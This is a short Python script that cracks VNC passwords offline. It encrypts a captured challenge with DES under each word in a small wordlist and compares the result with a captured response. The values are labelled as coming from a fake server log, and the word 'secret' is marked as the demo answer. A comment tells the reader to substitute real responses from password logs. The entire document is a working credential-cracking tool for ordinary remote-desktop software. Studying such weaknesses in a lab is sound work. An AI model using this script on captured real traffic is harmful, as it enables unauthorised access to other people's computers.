from Crypto.Cipher import DES

# Captured from fake server log
captured_challenge = bytes.fromhex("bd35d217b45d6eba9723baac29f7b9f5")
captured_response = bytes.fromhex("faa75e316d5fc4de969ff3f48796eaf8")  # replace with actual response from the password logs

wordlist = [
    "123456",
    "password",
    "admin",
    "letmein",
    "qwerty",
    "secret",  # correct password for demo 
    "welcome",
]

def reverse_bits(byte):
    return int('{:08b}'.format(byte)[::-1], 2)

def des_encrypt_challenge(challenge, password):
    key = password.encode('latin-1').ljust(8, b'\x00')[:8]
    key = bytes([reverse_bits(b) for b in key])
    des = DES.new(key, DES.MODE_ECB)
    return des.encrypt(challenge[:8]) + des.encrypt(challenge[8:])

def crack_vnc_password(challenge, expected_response, wordlist):
    print("Starting brute-force...")
    for password in wordlist:
        response = des_encrypt_challenge(challenge, password)
        if response == expected_response:
            print(f" Password cracked: '{password}'")
            return password
    print(" Password not found in wordlist.")
    return None

if __name__ == "__main__":
    crack_vnc_password(captured_challenge, captured_response, wordlist)